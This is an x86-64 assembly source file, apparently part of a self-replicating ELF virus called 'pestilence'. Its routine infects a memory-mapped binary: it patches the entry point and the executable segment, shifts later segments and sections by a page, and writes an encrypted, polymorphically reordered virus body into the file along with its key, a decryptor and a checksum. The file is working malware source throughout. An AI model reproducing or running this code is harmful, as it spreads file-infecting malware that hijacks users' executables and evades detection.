%define UPDATE_MMAPED_FILE_S
%include "pestilence.lst"

section .text
	global _update_mmaped_file

_update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
	enter 256, 0
	; rsp + 0  mmap start address (ehdr)
	; rsp + 8  file size
	; rsp + 16 virus size
	; rsp + 24 fd
	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
	; rsp + 40 shdr (ehdr + ehdr->e_shoff)
	; rsp + 48 actual phnum or actual shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 56 ehdr->e_phnum or ehdr->e_shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 64 found? bool
	; rsp + 72 virus offset
	; rsp + 80 o_entry store address (it's the address where we store the o_entry, (char *))
	; rsp + 88 number of 0 bytes to add
	; rsp + 96 i
	; rsp + 104 = 0
	; rsp + 108 mmap_tmp addr
	; rsp + 116 index mmap_tmp
	; rsp + 124 set to 1 if infection worked, 0 else
	; rsp + 132 key addr
	; rsp + 140 text section offset in file
	; rsp + 148 text section vaddr
	;;;;;;;;;;;;;;;;;;;;;

; init phase
; first mov all params on stack
	mov QWORD [rsp], rdi

	mov QWORD [rsp + 8], rsi

	mov QWORD [rsp + 16], rdx

	mov QWORD [rsp + 24], r10
	mov QWORD [rsp + 124], 0

; init phdr (ehdr + ehdr->e_phoff)
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 32], r10 ; store it on stack
	add QWORD [rsp + 32], 32 ; add 32 on the address (offset on the header for e_phoff)
	mov r10, QWORD [rsp + 32] ; take this address
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 32], r10 ; mov it on stack
	mov r10, QWORD [rsp] ; take the mmap_base_address
	add QWORD [rsp + 32], r10 ; add it to our offset

; init shdr (ehdr + ehdr->e_shoff)
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 40], r10 ; store it on stack
	add QWORD [rsp + 40], 40 ; add 40 on the address (offset ont the header for e_shoff) 
	mov r10, QWORD [rsp + 40] ; take this address
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 40], r10 ; mov it on stack
	mov r10, QWORD [rsp] ; take the mmap_base_address
	add QWORD [rsp + 40], r10 ; add it to our offset

; init actual phnum
	mov QWORD [rsp + 48], 0

; take the number of segment
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 56], r10 ; store it on stack
	add QWORD [rsp + 56], 56 ; add 56 to it (offset for e_phnum)
	mov r11, QWORD [rsp + 56] ; take this addres
	xor r10, r10 ; clear r10, we will move a 2 bytes value on it, so we need to clear it before
	mov r10w, WORD [r11] ; dereference our addres to take e_phnum
	mov QWORD [rsp + 56], r10 ; store it on stack

; found = 0
	mov QWORD [rsp + 64], 0

; virus offset = 0
	mov QWORD [rsp + 72], 0

_treat_all_segments:
	mov r10, QWORD [rsp + 56] ; take e_phnum
	cmp QWORD [rsp + 48], r10 ; while phnum < ehdr->e_phnum
	jge _init_treat_all_sections
; check if our segment offset is in file size
	mov r10, QWORD [rsp + 32] ; take phdr
	sub r10, QWORD [rsp] ; sub the mmap_base_addr, to take the offset of the actual segment header
	cmp r10, QWORD [rsp + 8] ; check if this offset < file_size
	jge _munmap

_if:
	cmp QWORD [rsp + 64], 0 ; if found
	je _else_if
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 bytes to acces p_offset
	mov r10, QWORD [r10] ; dereference it to take the value
	cmp r10, QWORD [rsp + 72] ; if phdr->p_offset >= virus offset
	jl _else_if
	mov r10, QWORD [rsp + 32] ; add PAGE_SIZE to segment offset
	add r10, 8
	add QWORD [r10], PAGE_SIZE
	jmp _inc_jmp_loop

_else_if:
	mov r10, QWORD [rsp + 32] ; take phdr
	cmp DWORD [r10], 1 ; if phdr->p_type == PT_LOAD
	jne _inc_jmp_loop
	add r10, 4 ; offset of p_flags
	mov r10d, DWORD [r10] ; dereference it to take the value
	and r10d, 1 ; logical and for the flag
	cmp r10d, 1 ; if phdr->p_flags & PF_X
	jne _inc_jmp_loop
; virus offset = phdr->p_offset + phdr->p_filesz
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 bytes to take p_offset (offset of the segment in file)
	mov r12, QWORD [r10]
	mov QWORD [rsp + 140], r12
	mov r12, r10
	add r12, 8
	mov r12, QWORD [r12]
	mov QWORD [rsp + 148], r12

	mov r11, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 72], r11 ; store it on stack, virus_offset = phdr->p_offset
	add r10, 24 ; offset of p_filesz is 32, we already added 8, so 32 - 8 = 24.
	mov r11, QWORD [r10] ; dereference
	add QWORD [rsp + 72], r11 ; virus offset += phdr->p_filesz
; modify e_entry
	mov r11, QWORD [rsp] ; take mmap_base_addr
	add r11, 24 ; e_entry offset
	mov rdi, QWORD [r11] ; take the actual e_entry by dereferencing
	mov QWORD [rsp + 80], rdi ; store it on stack, we will need it
	inc QWORD [rsp + 64] ; found++
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 16 ; p_vaddr offset
	mov rdi, QWORD [r10] ; take p_vaddr value
	mov QWORD [r11], rdi ; store in on e_entry
	add r10, 16 ; p_filesz offset is 32, we already add 16, so 32 - 16 = 16
	mov r12, QWORD [r10] ; take p_filesz value
	add QWORD [r11], r12 ; add it to e_entry, so e_entry = p_vaddr + p_filesz
; take the size of _o_entry + _string.
	lea r8, [rel _o_entry]
	lea r9, [rel _start]
	sub r9, r8
	add QWORD [r11], r9 ; add the offset of the strings at the beginning of the virus
; update p_filesz and p_memsz
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 32 ; p_filesz offset
	mov r11, PAGE_SIZE
	add QWORD [r10], r11 ; add virus_size to the segment size in file and in memory
	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
	add QWORD [r10], r11

_inc_jmp_loop:
	add QWORD [rsp + 32], 56 ; 56 is the size of our struct, so we jmp to the next struct
	inc QWORD [rsp + 48] ; inc our phnum
	jmp _treat_all_segments

_init_treat_all_sections:
	mov QWORD [rsp + 48], 0 ; shnum = 0
	mov r10, QWORD [rsp] ; take mmap_base_address
	mov QWORD [rsp + 56], r10 ; store it on stack
	add QWORD [rsp + 56], 60 ; add 60 to take e_shnum
	mov r11, QWORD [rsp + 56] ; take the address
	xor r10, r10 ; clear r10
	mov r10w, WORD [r11] ; dereference our address to take e_shnum value
	mov QWORD [rsp + 56], r10 ; store it on stack

_treat_all_sections:
	mov r10, QWORD [rsp + 48] ; take shnum
	cmp r10, QWORD [rsp + 56] ; while (shnum < ehdr->e_shnum)
	jge _init_mmap_tmp
	mov r10, QWORD [rsp + 40] ; take shdr
	sub r10, QWORD [rsp] ; sub mmap_base_addr to shdr, to take the offset
	cmp r10, QWORD [rsp + 8] ; check if this offset is in file bounds
	jge _munmap

_if_offset_equal_virus_offset:
	xor r10, r10 ; clear r10
	mov r10, QWORD [rsp + 40] ; take shdr
	add r10, 24 ; shdr->sh_offset offset
	mov r11, QWORD [rsp + 40] ; take shdr
	add r11, 32 ; shdr->sh_size offset
	mov rdi, QWORD [r10] ; mov the value of sh_offset in rdi
	add rdi, QWORD [r11] ; add the value of sh_size
	cmp rdi, QWORD [rsp + 72] ; if (shdr->sh_offset + shdr->sh_size) == virus offset
	jne _if_offset_greater_or_equal_virus_offset
	mov r10, PAGE_SIZE
	add QWORD [r11], r10 ; add it to sh_size

_if_offset_greater_or_equal_virus_offset:
	xor r10, r10 ; clear r10
	mov r10, QWORD [rsp + 40] ; take shdr
	add r10, 24 ; shdr->sh_offset offset
	mov r10, QWORD [r10] ; dereference sh_offset addres
	cmp r10, QWORD [rsp + 72] ; if shdr->sh_offset >= virus offset
	jl _inc_jmp_loop_sections
; add PAGE_SIZE to sh_offset
	mov r10, QWORD [rsp + 40] ;take shdr
	add r10, 24 ; go to sh_offset
	add QWORD [r10], PAGE_SIZE ; add pagesize

_inc_jmp_loop_sections:
	inc QWORD [rsp + 48] ; inc shnum
	add QWORD [rsp + 40], 0x40 ; shdr struct size
	jmp _treat_all_sections

_init_mmap_tmp:
; add PAGESIZE to sections offset
	mov r10, QWORD [rsp] ; take mmap_base_addr
	add r10, 40 ; go to sh_offset
	add QWORD [r10], PAGE_SIZE ; add pagesize
;;;;;;;;;;;;;;;;;
; mmap tmp
_mmap_tmp:
	mov rax, SYS_MMAP
	mov rdi, 0
	mov rsi, QWORD [rsp + 8]
	add rsi, PAGE_SIZE
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_ANONYMOUS | MAP_PRIVATE
	mov r8, -1
	mov r9, 0
	syscall
	cmp rax, 0
	jle _end
	mov QWORD [rsp + 108], rax
	mov QWORD [rsp + 116], 0

_write_in_tmp_map:
;; memcpy(mmap_tmp, mmap, virus_offset);
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp]
	mov rcx, QWORD [rsp + 72]
	cld
	rep movsb
	mov r10, QWORD [rsp + 72]
	mov QWORD [rsp + 116], r10 ; add the number of bytes copied, it's the index of mmap_tmp
;; memcpy(mmap_tmp + index, o_entry, 8);
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rsi, rsp ;
	add rsi, 80
	mov rcx, 8 ; size
	cld
	rep movsb
	add QWORD [rsp + 116], 8 ; add 8 to our index

_copy_start_point:
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _string]
	lea rcx, [rel _checkproc]
	sub rcx, 8
	sub rcx, rsi
	add QWORD [rsp + 116], rcx ; add 8 to our index
	cld
	rep movsb

_copy_unencrypted_part:
	.init:
	mov QWORD [rsp + 156], 0 ; min
	mov QWORD [rsp + 164], 3 ; max
	lea r11, [rel _start]
	lea r12, [rel _checkproc]
	sub r12, 8
	sub r12, r11
	mov QWORD [rsp + 172], r12 ; first offset from start
	lea r10, [rel _checkproc]
	sub r10, 8
	lea r11, [rel _functions_offset_from_start]
	sub r11, r10
	add r11, QWORD [rsp + 116]
	add r11, QWORD [rsp + 108]
	mov QWORD [rsp + 180], r11 ; offset to table_offset on mmap
	mov QWORD [rsp + 188], 0
	mov QWORD [rsp + 196], 0
	mov QWORD [rsp + 204], 0
	.loop:
		mov rdi, QWORD [rsp + 156]
		mov rsi, QWORD [rsp + 164]
		mov rdx, 0x9485731273645823
		xor rax, rax
		call _urand
		xor rcx, rcx
		.look_for_unwrited_function:
			cmp BYTE [rsp + 188 + rcx], 0
			je .verif_rax
				inc rcx
				jmp .look_for_unwrited_function
			.verif_rax:
				cmp rax, 0
				je .write_function
				inc rcx
				dec rax
				jmp .look_for_unwrited_function
		.write_function:
		mov BYTE [rsp + 188 + rcx], 1
		mov rax, rcx
		mov rcx, 8
		mul rcx
		mov rdi, QWORD [rsp + 108]
		add rdi, QWORD [rsp + 116]
		lea rsi, [rel _functions_offset_from_start]
		add rsi, rax
		mov rcx, rsi
		add rcx, 8
		lea r10, [rel _start]
		mov rsi, QWORD [rsi]
		add rsi, r10
		sub rsi, 8
		mov rcx, QWORD [rcx]
		add rcx, r10
		sub rcx, 8
		cmp rax, 24
		jl .not_at_end_table
		lea rcx, [rel _functions_offset_from_start]
		.not_at_end_table:
		sub rcx, rsi
		mov QWORD [rsp + 204], rcx
		add QWORD [rsp + 116], rcx
		cld
		rep movsb
		mov rdi, QWORD [rsp + 180]
		mov rsi, QWORD [rsp + 172]
		mov QWORD [rdi], rsi
		add QWORD [rdi], 8
		mov rsi, QWORD [rsp + 204]
		add QWORD [rsp + 172], rsi
		add QWORD [rsp + 180], 8
		cmp QWORD [rsp + 164], 0
		jle .inc_with_table_size
		dec QWORD [rsp + 164]
		jmp .loop
	.inc_with_table_size:
	add QWORD [rsp + 116], 32

_copy_jump_to_function:
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _jump_to_function]
	lea rcx, [rel _encrypted_part_start]
	sub rcx, rsi
	add QWORD [rsp + 116], rcx
	cld
	rep movsb
; Incremente our index in our destination mmap
;	lea rsi, [rel _string]
;	lea rcx, [rel _encrypted_part_start]
;	sub rcx, rsi
;	add QWORD [rsp + 116], rcx

_copy_encrypt_zone:
;; encrypt_zone(virus, virus_size, mmap_tmp + index)
; setting parameters
; take the base addr to encrypt
	lea rdi, [rel _encrypted_part_start]
; calculate the size to encrypt
	lea rsi, [rel _padding]
;	lea rsi, [rel _final_end] ; take the end addr to encrypt
;	add rsi, 2
	sub rsi, rdi ; calculate the size to encrypt
; take the addr to store the encrypted part
	mov rdx, QWORD [rsp + 108] ; mmap addr
	add rdx, QWORD [rsp + 116] ; offset
	call _encrypt_zone
	mov QWORD [rsp + 132], rax ; take the key addr the function returned
	lea rsi, [rel _padding]
;	add rsi, 2
	lea r10, [rel _encrypted_part_start]
	sub rsi, r10
	add QWORD [rsp + 116], rsi

_copy_key:
;; memcpy(mmap_tmp + index, key, 256)
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rsi, QWORD [rsp + 132]
	mov rcx, 256
	cld
	rep movsb
	add QWORD [rsp + 116], 256

_inject_modified_depacker:
; First, copy the noped depacker to destination
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _decrypt]
	lea rcx, [rel _end_decrypt]
	add rcx, 2
	sub rcx, rsi
	cld
	rep movsb

; Then we run _byterpl(depacker start in destination, depacker size);
; to replace nop sleds by junks instructions
;	lea rcx, [rel _o_entry]
;	lea rsi, [rel _start]
;	sub rsi, rcx
;	mov rdi, QWORD [rsp + 108]
;	add rdi, rsi
;	add rdi, QWORD [rsp + 72]
;	call _byterpl

; Incremente our index in our destination mmap
	lea rsi, [rel _decrypt]
	lea rcx, [rel _end_decrypt]
	add rcx, 2
	sub rcx, rsi
	add QWORD [rsp + 116], rcx

_store_section_vaddr:
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov r10, QWORD [rsp + 148]
	mov QWORD [rdi], r10
	add QWORD [rsp + 116], 12

_calcul_checksum:
	mov rsi, QWORD [rsp + 116]
	sub rsi, 12
	sub rsi, QWORD [rsp + 140]
	add rdi, 8
	mov DWORD [rdi], esi
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 140]
	mov r12, 0x0303030303030303
	call _jump_to_function
;	call _crc32
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov DWORD [rdi], eax
	add QWORD [rsp + 116], 4

_align_to_page_size:
; for i < PAGE_SIZE - (virus_size + 8 + key_size(256) + decrypt_size) memset(mmap_tmp, 0, 1);
	mov QWORD [rsp + 88], PAGE_SIZE
	mov rdi, QWORD [rsp + 16]
	add rdi, 8
	add rdi, 256
	lea r10, [rel _checksum]
	lea r11, [rel _decrypt]
	add r10, 4
	sub r10, r11
	add rdi, r10
	sub QWORD [rsp + 88], rdi
	mov rcx, QWORD [rsp + 88]
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rax, 0
	cld
	rep stosb
	mov r10, QWORD [rsp + 88]
	add QWORD [rsp + 116], r10 ; add PAGE_SIZE - (virus_size + 8) to our index

_last_write:
;; memcpy(mmap_tmp + index, mmap + virus_offset, file_size - virus_offset);
	mov rdi, QWORD [rsp + 108] ; fd
	add rdi, QWORD [rsp + 116]
	mov rsi, QWORD [rsp] ; buff
	add rsi, QWORD [rsp + 72]
	mov rcx, QWORD [rsp + 8] ; size
	sub rcx, QWORD [rsp + 72]
	cld
	rep movsb

_write_into_file:
;; write(fd, mmap_tmp, file_size + PAGE_SIZE)
	mov rax, SYS_WRITE
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 108]
	mov rdx, QWORD [rsp + 8]
	add rdx, PAGE_SIZE
	syscall
	mov QWORD [rsp + 124], 1

_munmap_key:
	mov rax, SYS_MUNMAP
	mov rdi, QWORD [rsp + 132]
	mov rsi, 256
	syscall

_munmap:
	mov rax, SYS_MUNMAP
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp + 8]
	add rsi, PAGE_SIZE
	syscall

_end:
	mov rax, QWORD [rsp + 124]
	leave
	ret

%undef UPDATE_MMAPED_FILE_S
